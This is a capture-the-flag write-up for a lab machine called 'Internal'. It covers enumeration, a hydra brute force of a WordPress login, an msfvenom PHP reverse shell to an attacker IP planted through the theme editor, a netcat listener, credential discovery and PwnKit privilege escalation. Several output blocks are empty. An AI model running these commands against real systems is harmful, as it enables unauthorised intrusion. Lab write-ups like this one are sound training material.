# Information Gathering
We are briefed:

> You have been assigned to a client that wants a penetration test conducted on an environment due to be released to production in three weeks. 
> 
> Scope of Work
> 
> The client requests that an engineer conducts an external, web app, and internal assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test).  The client has asked that you secure two flags (no location provided) as proof of exploitation:
> 
> User.txt
> Root.txt
> Additionally, the client has provided the following scope allowances:
> 
> Ensure that you modify your hosts file to reflect internal.thm
> Any tools or techniques are permitted in this engagement
> Locate and note all vulnerabilities found
> Submit the flags discovered to the dashboard
> Only the IP address assigned to your machine is in scope
> (Roleplay off)
> 
> I encourage you to approach this challenge as an actual penetration test. Consider writing a report, to include an executive summary, vulnerability and exploitation assessment, and remediation suggestions, as this will benefit you in preparation for the eLearnsecurity eCPPT or career as a penetration tester in the field.

> 
> Note - this room can be completed without Metasploit

> **Writeups will not be accepted for this room.**

The target IP address is `10.10.179.181`.

Our objectives are to:

1. locate and obtain the `User.txt` file,
2. locate and obtain the `Root.txt` file,
3. document all vulnerabilities found, and
4. provide remediation suggestions.

# Enumeration
We begin with the nmap scan `nmap -T5 -A -O 10.10.179.181`, which reveals 

```

Immediately, we notice the default page for an Apache web server.

We then fuzz for directories using the command `ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.179.181/FUZZ -ic`. This outputs

```

```

We notice that some of the functionality use by the web application uses the domain name `internal.thm` to refer to the target,
so we add the entry `10.10.179.181 internal.thm` to our `/etc/hosts` file.

Our initial observation is that
the wordpress login provides different output when a failed authentication attempt is made with a valid username than it does
when an invalid username is used, simplifying authentication bypass. Moreover, the `phpmyadmin` portal is accessible to the outside world. This is completely unnecessary and poses significant security risks.

Upon navigating to the endpoint `http://internal.thm/wordpress/` and clicking on the `Entries Feed` tab, we automatically
download a file named `n-T86yJG` containing XML data to be used by RSS readers.

![](/assets/img/internal/wordpresslink.png)

This file contains the line
`<generator>https://wordpress.org/?v=5.4.2</generator>`, which indicates that the web server is using wordpress version
5.4.2. This is an information disclosure vulnerability, but it may be necessary for RSS to function properly in this case.

We also note that users can post comments anonymously, which makes this page vulnerable to injection attacks such as XSS.

# Exploitation
We opt to perform a brute force attack on the wordpress login form with the command

```
hydra 10.10.179.181 -l admin -P /usr/share/wordlists/rockyou.txt http-post-form "/blog/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Finternal.thm%2Fblog%2Fwp-admin%2F&testcookie=1:F=Lost your password?"
```

We quickly find the password is `my2boys` and login. Afterward, we generate a php reverse shell using the command
`msfvenom -p php/reverse_php LHOST=10.6.4.176 LPORT=6969 -o shell.php`, navigate to the theme editor, and copy the contents
of `shell.php` into the active theme's `index.php` file. 

![](/assets/img/internal/theme.png)

Then, we set up a netcat listener with `nc -lvnp 6969` and navigate to `http://internal.thm/blog/`. 
Consequently, we receive a shell as `www-data`.

# Post-Exploitation
To identify the local users on the system we exectute `cat /etc/passwd` and receive

```

```

In attempt to locate the user flag, we run `find / -type f -iname 'user.txt' 2>/dev/null`, but find the file 
`/usr/share/doc/phpmyadmin/html/_sources/user.txt`, which is not a flag. Likely, we need a user with different read permissions
than `www-data`.

While performing some manual enumeration, we list the contents of the `/opt` directory and find the file `wp-save.txt`. The
contents of this file are as follows:

```
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:<DOITURSELF:)>
```

With `ssh aubreanna@10.10.179.181`, we are able to successfully authenticate with the aforementioned password. This allows
us to capture the user flag:

Running `find / -type f -iname 'root.txt' 2>/dev/null` gives us no results, so we will have to elevate privileges even 
further to obtain the root flag.

Running linpeas on the machine indicates that it is vulnerable to CVE-2021-4034. We use the exploit at [https://github.com/ly4k/PwnKit](https://github.com/ly4k/PwnKit)
and gain root. As root, we rerun the previous `find` command and locate the root flag `/home/root/root.txt`.
